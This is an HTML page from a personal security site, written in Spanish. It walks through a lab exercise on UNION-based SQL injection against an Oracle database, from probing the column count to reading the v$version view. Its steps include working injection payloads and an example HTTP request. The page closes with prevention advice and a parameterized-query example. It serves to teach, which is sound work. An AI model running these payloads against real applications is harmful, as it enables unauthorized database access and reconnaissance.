@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Versión en Oracle | Laboratorios SQL Injection</title>
+    <link rel="shortcut icon" href="../../imagenes/github.svg" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../../css/style.css">
+    <style>
+        .article-content {
+            padding: 120px 0;
+        }
+        
+        .article-header {
+            margin-bottom: 40px;
+        }
+        
+        .article-title {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: var(--accent);
+        }
+        
+        .article-meta {
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .article-meta span {
+            margin-right: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .article-meta i {
+            margin-right: 8px;
+            color: var(--accent);
+        }
+        
+        .article-body {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        
+        .article-body h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px;
+            color: var(--accent);
+        }
+        
+        .article-body h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px;
+        }
+        
+        .article-body p {
+            margin-bottom: 20px;
+            line-height: 1.8;
+            color: var(--text-secondary);
+        }
+        
+        .article-body pre {
+            background-color: var(--secondary);
+            padding: 20px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .article-body code {
+            font-family: 'Courier New', monospace;
+            color: var(--accent);
+        }
+        
+        .article-body ul, .article-body ol {
+            margin: 20px 0;
+            padding-left: 20px;
+            color: var(--text-secondary);
+        }
+        
+        .article-body li {
+            margin-bottom: 10px;
+        }
+        
+        .diagram {
+            background-color: var(--secondary);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .diagram img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        
+        .caption {
+            color: var(--text-secondary);
+            font-style: italic;
+            margin-top: 10px;
+            text-align: center;
+        }
+        
+        .info-box {
+            background-color: rgba(100, 255, 218, 0.1);
+            border-left: 4px solid var(--accent);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .info-box h4 {
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+        
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: var(--text-secondary);
+        }
+        
+        .breadcrumb a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        
+        .breadcrumb span {
+            margin: 0 10px;
+        }
+        
+        .solution-box {
+            background-color: rgba(100, 255, 218, 0.1);
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 30px 0;
+        }
+        
+        .solution-box h3 {
+            color: var(--accent);
+            margin-bottom: 15px;
+        }
+        
+        @media (max-width: 768px) {
+            .article-title {
+                font-size: 2rem;
+            }
+            
+            .article-meta span {
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">Daniel Béjar</div>
+                <ul class="nav-links">
+                    <li><a href="../../index.html#about">Sobre mí</a></li>
+                    <li><a href="../../index.html#projects">Proyectos</a></li>
+                    <li><a href="index.html" class="active">SQLi Labs</a></li>
+                </ul>
+                <button class="menu-btn" id="menuBtn">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Article Content -->
+    <section class="article-content">
+        <div class="container">
+            <div class="breadcrumb">
+                <a href="../../index.html">Inicio</a>
+                <span>/</span>
+                <a href="index.html">Laboratorios SQL Injection</a>
+                <span>/</span>
+                <span>Consulta de Versión en Oracle</span>
+            </div>
+            
+            <div class="article-header">
+                <h1 class="article-title">Ataque de Inyección SQL para Consultar el Tipo y Versión de Base de Datos en Oracle</h1>
+                <div class="article-meta">
+                    <span><i class="fas fa-tag"></i> SQL Injection</span>
+                    <span><i class="fas fa-clock"></i> 12 min de lectura</span>
+                    <span><i class="fas fa-calendar"></i> 25 Julio 2025</span>
+                </div>
+            </div>
+            
+            <div class="article-body">
+                <h2>Introducción</h2>
+                <p>
+                    Este laboratorio se centra en explotar una vulnerabilidad de inyección SQL en el filtro de categoría de productos
+                    para recuperar información sobre el tipo y versión de la base de datos Oracle. La técnica utiliza un ataque UNION
+                    para combinar los resultados de la consulta original con los resultados de una consulta que recupera información
+                    de la vista <code>v$version</code> de Oracle.
+                </p>
+                
+                <div class="info-box">
+                    <h4>Contexto del laboratorio</h4>
+                    <p>
+                        La aplicación web contiene una vulnerabilidad de inyección SQL en el filtro de categorías de productos.
+                        El objetivo es utilizar un ataque UNION para recuperar la información de versión de la base de datos Oracle
+                        y resolver el laboratorio mostrando esta información.
+                    </p>
+                </div>
+                
+                <h2>Requisitos para el ataque UNION</h2>
+                <p>
+                    Para realizar un ataque UNION exitoso, necesitamos cumplir con dos requisitos fundamentales:
+                </p>
+                
+                <ol>
+                    <li>Ambas consultas deben devolver el mismo número de columnas.</li>
+                    <li>Los tipos de datos de cada columna deben ser compatibles entre las consultas.</li>
+                </ol>
+                
+                <div class="diagram">
+                    <svg width="100%" height="220" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="50" y="30" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="55" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Consulta Original</text>
+                        
+                        <rect x="50" y="100" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="125" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Consulta UNION</text>
+                        
+                        <path d="M200 70L200 100" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,70 195,80 205,80" fill="#64ffda" />
+                        
+                        <rect x="50" y="170" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="195" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Resultado Combinado</text>
+                        
+                        <path d="M200 140L200 170" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,140 195,150 205,150" fill="#64ffda" />
+                        
+                        <text x="360" y="125" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">Mismo número de columnas</text>
+                        <text x="360" y="140" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">Tipos de datos compatibles</text>
+                    </svg>
+                    <p class="caption">Figura 1: Requisitos para un ataque UNION exitoso</p>
+                </div>
+                
+                <h2>Proceso de explotación</h2>
+                
+                <h3>1. Determinar el número de columnas</h3>
+                <p>
+                    Primero necesitamos determinar cuántas columnas devuelve la consulta original. Podemos hacer esto usando
+                    la cláusula <code>ORDER BY</code>:
+                </p>
+                
+                <pre><code>Pets' ORDER BY 1-- -
+Pets' ORDER BY 2-- -
+Pets' ORDER BY 3-- -</code></pre>
+                
+                <p>
+                    Continuamos incrementando el número hasta que recibamos un error, lo que indica que hemos excedido
+                    el número de columnas en la consulta original.
+                </p>
+                
+                <h3>2. Identificar columnas compatibles con texto</h3>
+                <p>
+                    Una vez que conocemos el número de columnas, necesitamos identificar cuáles de ellas son compatibles
+                    con datos de tipo texto:
+                </p>
+                
+                <pre><code>Pets' UNION SELECT 'a',NULL,NULL-- -
+Pets' UNION SELECT NULL,'a',NULL-- -
+Pets' UNION SELECT NULL,NULL,'a'-- -</code></pre>
+                
+                <p>
+                    Si la consulta se ejecuta sin errores, significa que la columna donde colocamos 'a' es compatible con texto.
+                </p>
+                
+                <h3>3. Consultar la versión de Oracle</h3>
+                <p>
+                    Oracle proporciona la vista <code>v$version</code> que contiene información sobre la versión de la base de datos.
+                    Utilizamos esta vista en nuestro ataque UNION:
+                </p>
+                
+                <pre><code>Pets' UNION SELECT 'a',banner FROM v$version-- -</code></pre>
+                
+                <div class="diagram">
+                    <svg width="100%" height="280" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="50" y="30" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="55" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Paso 1: Determinar columnas</text>
+                        
+                        <rect x="50" y="90" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="115" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Paso 2: Identificar columnas de texto</text>
+                        
+                        <rect x="50" y="150" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="175" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Paso 3: Consultar v$version</text>
+                        
+                        <rect x="50" y="210" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="235" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Resultado: Información de versión</text>
+                        
+                        <path d="M200 70L200 90" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,70 195,80 205,80" fill="#64ffda" />
+                        
+                        <path d="M200 130L200 150" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,130 195,140 205,140" fill="#64ffda" />
+                        
+                        <path d="M200 190L200 210" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,190 195,200 205,200" fill="#64ffda" />
+                        
+                        <text x="360" y="115" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">Usando ORDER BY</text>
+                        <text x="360" y="175" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">Probando con 'a'</text>
+                        <text x="360" y="235" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">Consultando v$version</text>
+                    </svg>
+                    <p class="caption">Figura 2: Proceso de explotación paso a paso</p>
+                </div>
+                
+                <h2>Solución del laboratorio</h2>
+                <p>
+                    Para resolver el laboratorio "SQL injection attack, querying the database type and version on Oracle":
+                </p>
+                
+                <ol>
+                    <li>Determine que la aplicación es vulnerable a inyección SQL en el filtro de categoría.</li>
+                    <li>Identifique que la base de datos es Oracle (puede probar con funciones específicas de Oracle).</li>
+                    <li>Determine el número de columnas usando <code>ORDER BY</code>.</li>
+                    <li>Identifique las columnas compatibles con texto.</li>
+                    <li>Ejecute el ataque UNION para recuperar información de <code>v$version</code>.</li>
+                </ol>
+                
+                <div class="solution-box">
+                    <h3>Solución final</h3>
+                    <p>El payload final para resolver el laboratorio es:</p>
+                    <pre><code>Pets' UNION SELECT 'a',banner FROM v$version-- -</code></pre>
+                    <p>Este payload:</p>
+                    <ul>
+                        <li>Inyecta en la categoría "Pets"</li>
+                        <li>Utiliza UNION para combinar con una consulta a v$version</li>
+                        <li>Selecciona 'a' para la primera columna (que debe ser compatible con texto)</li>
+                        <li>Selecciona la columna "banner" de la vista v$version para la segunda columna</li>
+                        <li>Comenta el resto de la consulta original con <code>-- -</code></li>
+                    </ul>
+                </div>
+                
+                <h3>Ejemplo de solicitud HTTP</h3>
+                <pre><code>GET /filter?category=Pets'+UNION+SELECT+'a',banner+FROM+v$version--+- HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session-id=123456789
+...</code></pre>
+                
+                <h2>Información obtenida de v$version</h2>
+                <p>
+                    La vista <code>v$version</code> de Oracle contiene información detallada sobre la versión de la base de datos.
+                    Los resultados típicos incluyen:
+                </p>
+                
+                <pre><code>Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production
+PL/SQL Release 19.0.0.0.0 - Production
+CORE    19.0.0.0.0      Production
+TNS for Linux: Version 19.0.0.0.0 - Production
+NLSRTL Version 19.0.0.0.0 - Production</code></pre>
+                
+                <div class="info-box">
+                    <h4>Importancia de la información de versión</h4>
+                    <p>
+                        Conocer la versión exacta de la base de datos es crucial para un atacante, ya que permite:
+                    </p>
+                    <ul>
+                        <li>Identificar vulnerabilidades específicas de esa versión</li>
+                        <li>Buscar exploits conocidos para esa versión</li>
+                        <li>Adaptar los ataques a las características específicas de la versión</li>
+                        <li>Eludir medidas de seguridad basadas en la versión</li>
+                    </ul>
+                </div>
+                
+                <h2>Medidas de prevención</h2>
+                <p>
+                    Para prevenir este tipo de ataques de inyección SQL, se recomienda:
+                </p>
+                
+                <ul>
+                    <li>Utilizar consultas parametrizadas (prepared statements) para todas las operaciones de base de datos.</li>
+                    <li>Validar y sanitizar todas las entradas del usuario.</li>
+                    <li>Implementar el principio de mínimo privilegio para cuentas de base de datos.</li>
+                    <li>Utilizar procedimientos almacenados cuando sea posible.</li>
+                    <li>Limitar la información de error que se muestra a los usuarios.</li>
+                    <li>Actualizar regularmente el sistema de gestión de base de datos.</li>
+                </ul>
+                
+                <div class="info-box">
+                    <h4>Ejemplo de consulta parametrizada</h4>
+                    <pre><code>// Ejemplo en Java con PreparedStatement
+String category = request.getParameter("category");
+String query = "SELECT * FROM products WHERE category = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, category);
+ResultSet rs = stmt.executeQuery();</code></pre>
+                </div>
+                
+                <h2>Conclusión</h2>
+                <p>
+                    Este laboratorio demuestra cómo explotar una vulnerabilidad de inyección SQL para recuperar información
+                    sensible sobre la base de datos, específicamente la versión de Oracle. La capacidad de determinar la
+                    versión exacta de la base de datos es valiosa para un atacante, ya que permite adaptar ataques adicionales
+                    a las características específicas de esa versión.
+                </p>
+                
+                <p>
+                    La implementación de consultas parametrizadas y una validación rigurosa de la entrada del usuario son
+                    esenciales para prevenir este tipo de vulnerabilidades. Además, es importante seguir el principio de
+                    mínimo privilegio y mantener actualizado el software de base de datos para mitigar los riesgos asociados
+                    con las vulnerabilidades conocidas.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="social-links">
+                <a href="https://github.com/Daniel-Bejar"><i class="fab fa-github"></i></a>
+                <a href="https://www.linkedin.com/in/daniel-béjar-a91713206"><i class="fab fa-linkedin"></i></a>
+                <a href="https://hackerone.com/doniti?type=user"><i class="fab fa-hackerrank"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../js/script.js"></script>
+</body>
+</html>
